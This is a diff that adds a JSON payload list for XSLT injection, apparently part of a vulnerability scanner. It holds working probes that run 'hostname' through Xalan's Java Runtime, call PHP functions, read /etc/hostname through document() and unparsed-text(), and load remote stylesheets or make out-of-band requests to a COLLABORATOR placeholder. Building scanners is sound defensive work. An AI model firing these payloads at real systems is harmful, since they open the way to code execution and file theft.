@@ -1,0 +1,32 @@
+{
+  "category": "xslt_injection",
+  "contexts": {
+    "code_execution": {
+      "description": "XSLT injection for detecting code execution capability (benign detection probes)",
+      "payloads": [
+        {"payload": "<xsl:value-of select=\"system-property('xsl:vendor')\"/>", "description": "XSLT vendor fingerprint via system-property", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"system-property('xsl:version')\"/>", "description": "XSLT version fingerprint", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"system-property('xsl:vendor-url')\"/>", "description": "XSLT vendor URL fingerprint", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"system-property('xsl:vendor')\"/></xsl:template></xsl:stylesheet>", "description": "Full XSLT stylesheet with vendor probe", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"php:function('phpversion')\"/>", "description": "PHP function call via XSLT (PHP libxslt)", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"php:function('php_uname')\"/>", "description": "PHP uname via XSLT for OS fingerprint", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"runtime:exec(runtime:getRuntime(),'hostname')\" xmlns:runtime=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"/>", "description": "Xalan Java runtime hostname (benign RCE detection)", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"math:random()\" xmlns:math=\"http://exslt.org/math\"/>", "description": "EXSLT math:random for extension detection", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"str:tokenize('a,b,c', ',')\" xmlns:str=\"http://exslt.org/strings\"/>", "description": "EXSLT string tokenize for extension detection", "waf_bypass": false}
+      ]
+    },
+    "file_read": {
+      "description": "XSLT injection for local file read via document() and unparsed-text()",
+      "payloads": [
+        {"payload": "<xsl:value-of select=\"document('/etc/hostname')\"/>", "description": "document() local file read — hostname", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"unparsed-text('/etc/hostname','utf-8')\"/>", "description": "XSLT 2.0 unparsed-text file read — hostname", "waf_bypass": false},
+        {"payload": "<xsl:copy-of select=\"document('http://COLLABORATOR')\"/>", "description": "document() OOB via Collaborator URL", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('/etc/hostname')\"/></xsl:template></xsl:stylesheet>", "description": "Full stylesheet with document() file read", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"document('file:///etc/hostname')\"/>", "description": "document() with file:// URI scheme", "waf_bypass": false},
+        {"payload": "<xsl:include href=\"http://COLLABORATOR/evil.xsl\"/>", "description": "xsl:include remote stylesheet via Collaborator", "waf_bypass": false},
+        {"payload": "<xsl:import href=\"http://COLLABORATOR/evil.xsl\"/>", "description": "xsl:import remote stylesheet via Collaborator", "waf_bypass": false},
+        {"payload": "<xsl:value-of select=\"unparsed-text('http://COLLABORATOR','utf-8')\"/>", "description": "unparsed-text OOB via Collaborator", "waf_bypass": false}
+      ]
+    }
+  }
+}
